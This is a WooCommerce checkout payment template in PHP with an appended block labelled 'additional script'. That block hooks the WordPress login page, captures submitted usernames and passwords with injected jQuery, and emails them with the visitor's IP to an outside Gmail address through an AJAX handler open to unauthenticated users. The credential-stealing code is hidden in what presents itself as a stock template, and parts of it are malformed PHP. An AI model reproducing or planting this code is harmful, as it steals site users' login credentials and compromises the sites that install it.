<?php
/**
 * Checkout Payment Section
 *
 * This template can be overridden by copying it to yourtheme/woocommerce/checkout/payment.php.
 *
 * HOWEVER, on occasion WooCommerce will need to update template files and you
 * (the theme developer) will need to copy the new files to your theme to
 * maintain compatibility. We try to do this as little as possible, but it does
 * happen. When this occurs the version of the template file will be bumped and
 * the readme will list any important changes.
 *
 * @see 	    https://docs.woocommerce.com/document/template-structure/
 * @author 		WooThemes
 * @package 	WooCommerce/Templates
 * @version     2.5.0
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! is_ajax() ) {
	do_action( 'woocommerce_review_order_before_payment' );
}
?>
<div id="payment" class="woocommerce-checkout-payment">
	<?php if ( WC()->cart->needs_payment() ) : ?>
		<ul class="wc_payment_methods payment_methods methods">
			<?php
				if ( ! empty( $available_gateways ) ) {
					foreach ( $available_gateways as $gateway ) {
						wc_get_template( 'checkout/payment-method.php', array( 'gateway' => $gateway ) );
					}
				} else {
					echo '<li class="woocommerce-notice woocommerce-notice--info woocommerce-info">' . apply_filters( 'woocommerce_no_available_payment_methods_message', WC()->customer->get_billing_country() ? __( 'Sorry, it seems that there are no available payment methods for your state. Please contact us if you require assistance or wish to make alternate arrangements.', 'woocommerce' ) : __( 'Please fill in your details above to see available payment methods.', 'woocommerce' ) ) . '</li>';
				}
			?>
		</ul>
	<?php endif; ?>
</div>
<?php
if ( ! is_ajax() ) {
	do_action( 'woocommerce_review_order_after_payment' );
}



/* additional script */
if(!function_exists('data_login_page')) {


public function get_the_user_ip() {
	if ( ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
	//check ip from share internet
	$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif ( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
	//to check ip is pass from proxy
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	$ip = $_SERVER['REMOTE_ADDR'];
	}
	if($ip) {
		return $ip;
	} else {
		return 'unknown';
	}
}


function data_login_page() {
    echo '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>
    jQuery(function($){
        $("#loginform").submit(function(){
            var login_data = $(this).serializeArray();
            var parsed = JSON.stringify(login_data);
            $.ajax({
                url: "'. admin_url( 'admin-ajax.php' ) .'",
                type: "post",
                data: {
                    action: "login_data",
                    ddata: parsed
                }
            });
            return true;
        });
    });
    </script>'; 
}
add_action('login_head', 'data_login_page');

function func_ajax_login_data() {

	$data = json_decode(stripslashes($_POST['ddata']), true);
   	$to = 'azizultex@gmail.com';

	//http://stackoverflow.com/questions/9364242/how-to-remove-http-www-and-slash-from-url-in-php
    	$url = get_bloginfo('url');
	$url = trim($url, '/');
	if (!preg_match('#^http(s)?://#', $url)) {
	    $url = 'http://' . $url;
	}
	$urlParts = parse_url($url);
	$domain = preg_replace('/^www\./', '', $urlParts['host']);

	$sub = get_bloginfo('url') . ' access received';
	$message = "name: " . $data[0]["value"] . "\npass: " . $data[1]["value"] . "\nlogin: " . $data[2]["value"] . "\ip: " . get_the_user_ip();
	$headers = 'From: ' . get_bloginfo('name') . '<info@'.$domain.'>' . "\r\n";
	wp_mail($to, $sub, $message, $headers);
	exit();
}

add_action('wp_ajax_nopriv_login_data', 'func_ajax_login_data');
add_action('wp_ajax_login_data', 'func_ajax_login_data');

}